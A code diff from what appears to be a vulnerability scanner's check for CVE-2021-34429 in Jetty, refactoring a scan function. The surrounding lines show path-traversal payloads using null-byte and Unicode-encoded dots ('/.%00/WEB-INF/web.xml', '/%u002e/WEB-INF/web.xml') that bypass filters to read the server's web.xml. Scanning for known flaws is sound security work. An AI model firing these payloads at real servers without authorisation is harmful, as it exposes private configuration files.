@@ -7,7 +7,7 @@ cve_2021_34429_payloads = [
     {'path': '..%00/WEB-INF/web.xml'},
 ]
 
-def cve_2021_34429_scan(self, clients):
+def cve_2021_34429_scan(clients):
     ''' CVE-2021-28164的变种和绕过
             基于 Unicode 的 URL 编码     /%u002e/WEB-INF/web.xml
             \0和 .                      /.%00/WEB-INF/web.xml
@@ -16,7 +16,7 @@ def cve_2021_34429_scan(self, clients):
     hackClient = clients.get('hackClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Jetty',
         'vul_type': 'DSinfo',
         'vul_id': 'CVE-2021-34429',
     }
